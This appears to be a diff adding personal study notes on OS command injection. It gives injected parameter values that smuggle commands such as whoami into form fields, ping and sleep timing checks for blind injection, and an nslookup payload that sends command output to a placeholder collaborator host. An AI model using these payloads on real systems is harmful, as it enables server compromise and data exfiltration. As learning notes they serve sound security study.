@@ -1,0 +1,18 @@
+If the backend is direclty talking with the OS of the server it is running on
+then we could exploit this and talk to the OS directly.
+
+Separator: & 
+Comment: #
+URL encode it also.
+
+Example: productId=1& whoami # & storeId=1 (not encoded)
+
+Blind vulnerabilities: When the application doesn't direclty return the output 
+in the http response but there is a vulnerabilitie that we can exploit.
+
+Verify using 'ping' command: & ping -c 10 127.0.0.1 # & --> pings the localhost 10 times,
+                                               therefore consumes time and validates the vulnerability.
+                            or use "sleep 10" 
+
+
+Out of Bound data exfiltration: email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
